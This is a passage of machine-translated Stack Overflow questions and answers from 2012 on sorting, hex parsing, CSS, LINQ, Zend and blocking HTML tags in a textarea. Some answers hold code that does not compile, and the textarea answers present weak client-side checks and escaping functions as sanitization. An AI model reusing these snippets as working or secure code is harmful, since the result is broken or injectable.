但你把它们按顺序排列`c, a, b`。可能您打算在`if (list[r] < list[p])`那里使用。

```
 }
            else 
```

`c <= a <= b`

```
 {
                exchange(list,median,r); 
```

以便按顺序排列它们`a, c, b`。

```
 }
        }
        else
            ;

    }
    else 
```

在这里，`b < a`。

```
 {
        comparisons++;
        if(list[p] > list[r])
        { 
```

`c < a`

```
 comparisons++;
            if(list[median] < list[r])
            { 
```

然后`b < c < a`

```
 int temp = list[p];
                list[p] = list[median];
                list[median] = list[r];
                list[r] = temp; 
```

是的，没错。

```
 }
            else 
```

`c <= b < a`

```
 {
                exchange(list,p,r);
            } 
```

奥克多克。

```
 }
        else
        { 
```

`b < a <= c`

```
 exchange(list,p,median); 
```

好的。

```
 }

    }

    return list[r];
} 
```

为什么这个函数会返回任何东西？无论如何，您都不使用返回值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T14:10:39.500

“递归插入排序算法的一般形式是”——如果你需要一个头递归算法，是的，否则更好的版本是：

```
void Insertionsort(int S[], int i, int n)
{
    Insert(S, i, n);
    if(i < n)
        Insertionsort(S, i+1, n);
} 
```

这更容易理解。此外，您不妨将 Insert 的主体放入 Insertionsort。

我不会尝试找出您过于复杂的快速排序版本。一个不错的快速排序大约是 20 行或更少（像这样 - www.algolist.net/Algorithms/Sorting/Quicksort）（并添加另外 10 行或更少用于插入排序）。我建议通过查看另一个实现并重写您的实现来更好地理解。

我相信这可以作为您[之前问题](https://stackoverflow.com/questions/13489895)的延伸提出。

# c++ - 将十六进制 std::string 转换为无符号字符

> ID：13490977
> 
> 赞同：2
> 
> 时间：2012-11-21T10:16:16.367
> 
> 标签：c++, string, hex, std

我有一个十六进制字符串，想将其转换为十六进制无符号字符数组！

```
std::string hex = "0c45a1bf"

unsigned char hexCh = ""
    [0] = "0c"
    [1] = "45"
    [2] = "a1"
    [3] = "bf" 
```

我希望以 hexCh 显示这种行为！

stringstream 和 std::hex 的最佳方法？你有实现吗？！

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:33:22.247

假设您想要每对十六进制字符串的**值：**

```
std::string hex = "0c45a1bf";

int main(int argc, char **argv)
{
    union U
    {
        unsigned int value;
        unsigned char components[4];
    };

    U u;

    std::stringstream SS(hex);
    SS >> std::hex >> u.value;

    std::cout << u.components[0] << '\n'; // the 0c value
    std::cout << u.components[1] << '\n'; // the 45 value
    std::cout << u.components[2] << '\n'; // the a1 value
    std::cout << u.components[3] << '\n'; // the bf value
} 
```

您可以将值读入 an`union`并获取每个子部分。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-21T10:33:27.550

使用`std::stringstream`+ `std::hex`：

```
std::stringstream ss;
std::string hex = "0c45a1bf";
std::vector<unsigned char> hexCh;
unsigned int buffer;
int offset = 0;
while (offset < hex.length()) {
   ss.clear();
   ss << std::hex << hex.substr(offset, 2);
   ss >> buffer;
   hexCh.push_back(static_cast<unsigned char>(buffer));
   offset += 2;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T11:03:36.997

您可以将整个字符串转换为更大的整数类型，然后从中挑选出字节。就像是：

```
std::vector<unsigned char>
asBytes( std::string const& input )
{
    std::istringstream parser( input );
    uint32_t tmp;
    input >> std::hex >> tmp;
    std::vector<unsigned char> results;
    //  The conversion implicitly does the & 0xFF
    results.push_back( tmp >> 24 );
    results.push_back( tmp >> 16 );
    results.push_back( tmp >>  8 );
    results.push_back( tmp       );
    return results;
} 
```

或者，您可以创建每个包含两个字符的子字符串，`std::istringstream`为每个字符创建一个，然后从中输入。您仍然必须输入大于 的类型`char`，因为`>>` 字符类型仅读取*一个*字符并分配它。但是您可以将其读入`int`，然后将其转换`int`为 `unsigned char`。

```
unsigned char
convertOneByte( std::string::const_iterator begin,
                std::string::const_iterator end )
{
    std::istringstream parser( std::string( begin, end ) );
    int tmp;
    parser >> std::hex >> tmp;
    return tmp;
}

std::vector<unsigned char>
asBytes( std::string const& input )
{
    std::vector<unsigned char> results;
    results.push_back( input.begin()    , input.begin() + 2 );
    results.push_back( input.begin() + 2, input.begin() + 4 );
    results.push_back( input.begin() + 4, input.begin() + 6 );
    results.push_back( input.begin() + 6, input.begin() + 8 );
    return results;
} 
```

（这两段代码都需要更多的错误检查。它们只是为了给你一个想法。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T12:05:39.720

这两个功能一起完成工作：

这个很简单：

```
inline int char2hex(char c)
{
   if (c >= '0' && c <= '9') return c - '0';
   if (c >= 'a' && c <= 'f') return c - 'a' + 10;
   if (c >= 'A' && c <= 'F') return c - 'A' + 10;
   throw std::runtime_error("wrong char");
} 
```

这有点复杂：

```
std::vector<unsigned char> str2hex(const std::string& hexStr)
{
     std::vector<unsigned char> retVal;
     bool highPart = ((hexStr.length() % 2) == 0);  
     // for odd number of characters - we add an extra 0 for the first one:
     if (!highPart)
         retVal.push_back(0);
     std::for_each(hexStr.begin(), hexStr.end(), 
        [&](char nextChar) {
           if (highPart) 
               // this is first char for the given hex number:
               retVal.push_back(0x10 * char2hex(nextChar));
           else
              // this is the second char for the given hex number
              retVal.back() += char2hex(nextChar);
           highPart = !highPart;
       }
     );

    return retVal;
} 
```

它的工作[示例](http://ideone.com/9xhU3U)：

```
int main() {
  std::string someHex =  "c45a1bf";
  std::vector<unsigned char> someUHex = str2hex(someHex);
  std::copy(someUHex.begin(), someUHex.end(), std::ostream_iterator<int>(std::cout << std::hex, ""));
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T12:18:04.980

一个可能的解决方案：（感谢 Denis Ermolin）：

```
void ClassA::FuncA(unsigned char *answer)
{
    std::string hex = "0c45a1bf";
    std::stringstream convertStream;

    // if you have something like "0c 45 a1 bf" -> delete blanks
    hex.erase( std::remove(hex.begin(), hex.end(), ' '), hex.end() );

    int offset = 0, i = 0;      
    while (offset < hex.length()) 
    {
        unsigned int buffer;

        convertStream << std::hex << hex.substr(offset, 2);         
        convertStream >> std::hex >> buffer;

        answer[i] = static_cast<unsigned char>(buffer);

        offset += 2;
        i++;

        // empty the stringstream
        convertStream.str(std::string());
        convertStream.clear();
    }
} 
```

# silverlight - 不是添加或删除，而是在 Silverlight 中编辑组合框项目？

> ID：13490982
> 
> 赞同：0
> 
> 时间：2012-11-21T10:16:40.673
> 
> 标签：silverlight, combobox

所以我有这个组合框，其中 ItemsSource 设置为对象列表。

之后我想做的是更改一个特定项目（列表中的第一个项目）的显示值，因为此标签在某些情况下不适合上下文，但在其他情况下适合。

到目前为止，我发现您可以使用**Add**方法**添加**一个项目，使用**Insert方法****插入**一个项目，然后使用**RemoveAt****删除**一个项目。

 ******但是你如何**更新**一个？我知道我可以在之后使用 RemoveAt 和 Insert ，但这会有点费力，而且我必须用它的所有值重新创建对象......

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:01:16.193

替换“对象列表”*中*的一个项目：

```
myList[0] = new MyObject("Another display text"). 
```

要使这个（和`Add`等`Remove`）起作用，您的列表必须是一个`ObservableCollection<T>`或任何其他实现`INotifyCollectionChanged`.

或者*修改*项目本身：

```
myList[0].DisplayText = "Another display text"; 
```

为此，您的`MyObject`类必须实现`INotifyPropertyChanged`，您必须在设置属性`PropertyChanged`时引发事件`DisplayText`，并且您必须正确设置您的`DisplayMemberPath`或。`ItemTemplate``ComboBox`

查看[MVVM 模式](https://duckduckgo.com/?q=mvvm)以获取更多信息。******

# html - 居中 使用 CSS

> ID：13490984
> 
> 赞同：0
> 
> 时间：2012-11-21T10:16:55.663
> 
> 标签：html, css, html-lists, center

我在页面顶部有一些导航链接，但无法将其放置在屏幕中央。任何人都可以建议我在 CSS 中哪里出错了吗？

图片：http: [//i.imgur.com/SUTWr.png](http://i.imgur.com/SUTWr.png)

这是CSS：

```
#nav {
list-style-type:none;
text-align:center
}

ul li {
display:inline-block;
border-radius:10px;
background:#EEE;
margin:5px;
}

li a {
float:left;
padding:30px;
text-decoration:none;
color:black;
text-shadow: 1px 1px #DDD;
border-radius:10px;
box-shadow:3px 3px black;
}

li a:hover {
background:#CCC;
color:#333;
}

li a:active {
background:#555;
color:white;
text-shadow: 1px 1px #000;
} 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:23:41.367

嗨，实际上我现在已经更新了你的**css**，我希望这项工作对你有用：-

**[演示](http://tinkerbin.com/WCGuCvbP)**

**CSS**

```
#nav {
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
     box-sizing: border-box;
    background: none repeat scroll 0 0 #B8B8B8;
    height: 400px;
    list-style-type: none;
    margin: auto;
    padding: 40px 0;
    width: 400px;
}

ul li {
display:inline;

}

li a {
text-decoration:none;
color:black;
text-shadow: 1px 1px #DDD;
border-radius:10px;
background:#EEE;
margin:5px;
padding:30px;
box-shadow:3px 3px black;
}

li a:hover {
background:#CCC;
color:#333;
}

li a:active {
background:#555;
color:white;
text-shadow: 1px 1px #000;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:19:58.807

尝试`<ul>`用`<div style="margin-left: auto; margin-right: auto">`.
这样，您可以`<ul>`一次将所有 -tags 居中。

如果图片中的“1,2,3,4,5”是 ul 元素，而#nav 是周围 div 的 id，则可以`margin-left: auto; margin-right: auto`在样式表中添加到 #nav。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:02:31.947

这是一个如何将 UL 居中的快速演示：http: [//jsfiddle.net/73Mum/1/](http://jsfiddle.net/73Mum/1/)

```
<div class="wrap">
 <ul>
    <li>one</li>
    <li>two</li>
    <li>three</li>
    <li>four</li>
    <li>five</li>
 </ul>
</div>

.wrap {
 text-align:center;
 background:#999;
 padding:100px 0;
}

ul {
 width:500px;
 margin:0 auto;
}
ul li {
 display:inline-block;
 padding:10px;
 background:#ccc;
} 
```

# xml - 如何发布用于 Android 应用程序数据访问的 XML 文件？

> ID：13490988
> 
> 赞同：0
> 
> 时间：2012-11-21T10:17:04.697
> 
> 标签：xml

我正在创建 android 应用程序，我需要在一些免费的服务器 xml 文件上发布。我试图在几个免费服务器上发布，但是当我通过浏览器打开 url 时，文件下载到我的电脑，而且应用程序也无法访问数据。我想做这样的事情：

[http://weather.yahooapis.com/forecastrss?w=12718298&u=c](http://weather.yahooapis.com/forecastrss?w=12718298&u=c)

该文件的内容如下所示： [http ://earthquake.usgs.gov/earthquakes/catalogs/1day-M2.5.xml](http://earthquake.usgs.gov/earthquakes/catalogs/1day-M2.5.xml)

我想对之前的链接做同样的事情。

如果有人知道如何解决这个问题，请写下来！

非常感谢 ！

# javascript - 限制用户使用 jquery 将 HTML TAGS 输入到文本区域

> ID：13490991
> 
> 赞同：0
> 
> 时间：2012-11-21T10:17:12.543
> 
> 标签：javascript, jquery

我有一个 textarea 字段，我希望用户无法将 HTML TAGS 输入到 textarea。

那可能吗？

**例子**

```
 <textarea rows="4" cols="30" id="textareadescription"></textarea> 
```

在这个用户无法输入 HTML TAGS 之类的

```
 <button> Submit </button> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T11:28:08.247

你可以这样做

```
function Check(){

var reg =/<(.|\n)*?>/g; 

if (reg.test($('#YourTextAreaID').val()) == true) {

    var ErrorText ='do not allow HTMLTAGS';

    alert('ErrorText');

    }
} 
```

更多 **信息**

[http://www.pagecolumn.com/tool/all_about_html_tags.htm](http://www.pagecolumn.com/tool/all_about_html_tags.htm)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-10-21T07:52:10.327

我会这样做的方式如下。这可以通过将替换重构为一个函数来提高效率。但是我详细说明了它以简单地解释程序...

```
 var str =   $('#textareadescription').val();
           //Temporarily replace the HTML elements I can accept
            str = str.replace(/<\/b>/g, "@@/b@@");
            str = str.replace(/<br>/g, "@@br@@");
            str = str.replace(/<i>/g, "@@i@@");
            str = str.replace(/<\/i>/g, "@@/i@@");

            //render all other HTML elements harmless
            str = str.replace(/</g, "&lt;");
            str = str.replace(/>/g, "&gt;");

            //put back the HTML elements I can accept
            str = str.replace(/@@b@@/g,"<b>");
            str = str.replace(/@@\/b@@/g,"</b>");
            str = str.replace(/@@i@@/g,"<i>");
            str = str.replace(/@@\/i@@/g,"</i>");
            str = str.replace(/@@br@@/g,"<br>");

//At this point str should contain only the HTML elements that I can accept. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:48:32.090

如果您的输入文本并不真正需要这些，您可以阻止用户输入`<`和签名。`>`

以下 javascript 代码执行此操作：

```
$(function(){
    $('#textareadescription').on("keydown", function(e){
        if (e.shiftKey && (e.which == 188 || e.which == 190)) {
            e.preventDefault();
        }
    });
});​ 
```

在此处试用工作演示：http: [//jsfiddle.net/AHrrP/1/](http://jsfiddle.net/AHrrP/1/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:39:19.313

以下是您可以选择的选项：

1.  您可以在 Textarea 上禁用 < 或 > 符号。[这](https://stackoverflow.com/questions/1735309/disabling-jquery-keypress-when-in-input-or-textarea-fields)将向您展示如何在特定按键上执行某些操作。
2.  您让他们在 textArea 中编写 html 标签。提交后，您重新处理字符串，然后将其发送到服务器。

下面是重新处理您的 textArea 内容的脚本

```
function reProcessText(){

        var text= $('myTextArea').html();
        var startTag=-1;
        var endTag=-1;
        for(var i=0;i<text.length;i++){
            if(text[i]=='<')
             startTag=i;
        if(text[i]=='>')
             endTag=i;
        if(startTag != -1 && endTag!=-1){
             text = text.substring(0,startTag) + text.substring(startTag+1, endTag);

            startTag=endTag=-1;
          }
        }  
} 
```

我编写了一个超级简单的算法来查找和替换 html 标签。当然，根据您的需要，您可能必须使用更复杂的一种。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T10:45:16.963

场景：

1.  用户在文本区域中输入“提交”。
2.  稍后，您复制该值并将其显示在 div 中。

所以你想做的是：

1.  确保 div 没有显示按钮。它将显示用户键入的确切值。

您可以在此处使用 jquery 的 html() 和 text() 函数。

例如：如果使用这个，结果 div 会生成一个按钮。

```
 <textarea rows="4" cols="30" onkeyup="$('#divDesc').html($('#textareadescription').val());" id="textareadescription"></textarea>
    <div id="divDesc"> Result </div> 
```

但是如果你使用这个，结果 div 不会生成按钮，而是显示值：

```
 <textarea rows="4" cols="30" onkeyup="$('#divDesc').text($('#textareadescription').val());" id="textareadescription"></textarea>
    <div id="divDesc"> Result </div> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-10-21T08:08:09.003

为了去除 html 标签，我使用。mysqli_real_escape_string(); 添加斜杠（）；

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2021-01-12T09:27:30.377

```
<script>
    $(document).ready(function() {
        $('#description').summernote(
            {
                placeholder: 'Description',
                tabsize: 2,
                height: 100,
                toolbar: [
                    ['style', ['bold', 'italic', 'underline', 'clear']],
                    ['fontsize', ['fontsize']],
                    ['para', ['ul', 'ol', 'paragraph']],
                    ['height', ['height']]
                ],
                codemirror:{theme: 'monokai'},
                fontNames: ['Arial', 'Arial Black', 'Comic Sans MS', 'Courier New']
            }
        );
    });
</script> 
```

# javascript - 在 href 点击上发送 ajax 帖子

> ID：13490992
> 
> 赞同：1
> 
> 时间：2012-11-21T10:17:14.277
> 
> 标签：javascript, jquery, joomla2.5

当我单击一个链接时，我需要`post`通过`ajax`. 问题是请求因打开链接而被丢弃。

```
jQuery('#pagination a').click(function(){
    jQuery.post('index.php?option=com_component',
        {checked_sites_for_session: jQuery('.selected-site input[type="checkbox"]').map(function () {return this.value;}).get()}
    ).success(function(){window.location = jQuery(this).attr('href')});
    console.log(jQuery(this).attr('href'));
    return false;
}); 
```

但同样的问题是（感谢 joomla）在 url - 就像`/~user/joomla/index.php/view-sites?view=sites&page=2`你看到它从斜杠开始，但真正的链接是`http://localhost/~user/joomla/index.php/view-sites?view=sites&page=2`，但在源代码中我有`<a href="index.php?option=com_component&view=sites&`.'.$option.'page='.$left。 '"//....`

所以我需要一些“多用途域解析解决方案”，或者只是停止 joomla 更改我的网址。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:20:59.193

使用本机 element.href 将为您提供包括域在内的整个 href，而不仅仅是属性值，`this`在 $,post 函数中使用的关键字也存在范围问题：

```
$('#pagination a').on('click', function(e){
    e.preventDefault();
    var self = this;
    $.post('index.php?option=com_component',
        {checked_sites_for_session: $('.selected-site input[type="checkbox"]').map(function () {
                 return this.value;
            }).get();
        }
    ).success(function(){
        window.location = self.href;
    });
}); 
```

从您发布的链接来看，它们看起来根本不一样，因此您可能必须为此弄清楚一些事情，因为某些 CMS 解决方案使用重写等。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-21T10:20:45.143

这个问题

```
 jQuery('#pagination a').click(function(e){
    e.preventDefault();
var me=this;
        jQuery.post('index.php?option=com_component',
            {checked_sites_for_session: jQuery('.selected-site input[type="checkbox"]').map(function () {return this.value;}).get()}
        ).success(function(){window.location = jQuery(this).attr('href')});
        console.log(jQuery(me).attr('href'));
        return false;
    }); 
```

# php - Smarty动态变量问题

> ID：13490993
> 
> 赞同：0
> 
> 时间：2012-11-21T10:17:15.507
> 
> 标签：php, mysql, smarty, smarty3

不幸的是，在我目前的工作场所，我必须在我入职前的一个项目中使用 Smarty。

无论如何，我正在尝试为应用程序中的每个类别调用一个动态 html 标题。

例如，标题曾经`pageTitle="{$category}`在`{$areaname}`“.

但是我现在希望它是：`pageTitle="{html_title}"`. 在`html_title`（来自 db）内，是一个字符串，例如：“ `Monkeys in the {areaname}`” Where `{areaname}`could be `"jungle`“。

当我输出结果时，我得到：

`"Monkeys in {areaname}"`.

所以长话短说，它没有认识到变量。它把它当作一个字符串。我用谷歌搜索了我的头，找不到答案。我讨厌聪明！
请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:26:46.867

你不能做类似的事情吗

```
$html_title = preg_replace("/{areaname}/", "jungle", $html_title); 
```

从数据库中获取标题后？

# c# - 返回 IEnumerable 来自 Linq 查询

> ID：13490994
> 
> 赞同：1
> 
> 时间：2012-11-21T10:17:15.717
> 
> 标签：c#, linq, ienumerable

我正在尝试`IEnumerable<string>`从 linq 查询返回一个，但出现错误：无法转换`IEnumerable<AnonymousType>`为`IEnumerable<string>`

我不知道如何解决这个问题。

```
private IEnumerable<string> GetAllMembers(Type type)
        {    

            var query =
                (from member in type.GetMembers()
                 select new
                 {
                     Member = member.GetType() + " " + member.ToString()

                 }
                );

            return query;
        } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:20:43.877

尝试这个

```
private IEnumerable<string> GetAllMembers(Type type)
    {    

        var query =
            from member in type.GetMembers()
             select member.GetType() + " " + member.ToString();

        return query;
    } 
```

当我认为您只是想要一个字符串枚举时，您正在创建一个匿名类型的 IEnumerable。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T10:20:08.377

`Member`您正在创建具有属性的匿名类型。只需返回字符串值，因此您可以期待`IEnumerable<string>`

```
private IEnumerable<string> GetAllMembers(Type type)
{    
    return from member in type.GetMembers()
           select member.GetType() + " " + member.ToString();
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T10:21:37.303

问题是您的查询返回一个匿名对象，该对象具有一个`Members`字符串属性，只需更改为仅返回字符串即可：

```
 var query =
            (from member in type.GetMembers()
             select member.GetType() + " " + member.ToString()
            );

  return query; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-21T10:20:56.457

您从查询中返回匿名类型（由 构造`new {}`），而不是字符串。例如，您可以像这样修改查询，因此结果是`IEnumerable<string>`：

```
return from member in type.GetMembers()
       select member.GetType() + " " + member.ToString(); 
```

# zend-framework - Zend_Config_Xml

> ID：13490995
> 
> 赞同：0
> 
> 时间：2012-11-21T10:17:16.597
> 
> 标签：zend-framework, zend-config-xml

所以我会在这里列出我的问题，请帮助

首先，我使用 Zend_Http_Client 来调用一个 url：

```
$client = new Zend_Http_Client('http://mydomain.com/Statistics.aspx?activity=top');
$response = $client->request('POST');
$response = $response->getRawBody(); 
```

然后，当我打印出来时，我得到了 $response 的 Xml 文档结构：

```
[?xml version='1.0' encoding='UTF-8'?]

[root]
    [member]
        [username>gh_MXH[/username]
        [money]129300[/money]
    [/member]
    [member]
        [username]sonhothiet_MXH[/username]
        [money]107400[/money]
    [/member]
[/root] 
```

之后，我使用 Zend_Config_Xml：

```
$xmlReader = new Zend_Config_Xml($response);
$xml = $xmlReader->toArray(); 
```

但是当我打印出 $xml 时，我得到的只是数组的第一个元素：

```
Array
(
    [member] => Array
        (
            [username] => gh_MXH
            [money] => 129300
        )

) 
```

请告诉我如何获取所有元素，以便我可以像这样循环：

```
foreach($xml as $key => $value){
    echo $value['username'] . 'has' . $value['money'];
} 
```

还有一个问题，当我写道：

```
$xml = new Zend_Config_Xml($response, 'root'); 
```

出现一条错误消息：无法在其中找到“根”部分。确实需要您的帮助。谢谢你，抱歉英语不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:04:19.037

不要`Zend_Config_Xml`用于解析标准 XML 文档，它是用于配置文件的。PHP 可以很容易地做到这一点：

```
$xml = simplexml_load_string($response);
foreach($xml->member as $member){
    echo $member->username . 'has' . $member->money;
} 
```

# javascript - 从移动网站在 Facebook 页面的墙上发帖

> ID：13490999
> 
> 赞同：1
> 
> 时间：2012-11-21T10:17:30.000
> 
> 标签：javascript, html, jsp

我有一个移动网站，里面有一个按钮。单击该按钮后，将代表当前登录的用户在预定义的 Facebook 页面的墙上发布静态文本。如果没有用户登录，则将显示登录窗口，一旦用户登录，相同的静态文本将张贴在页面的墙上。

我该怎么做 ？我尝试使用图形 api，但需要 all.js 并且找不到它。其他方法需要访问令牌，并且仅适用于 facebook 应用程序。这可以通过一些网址来完成吗？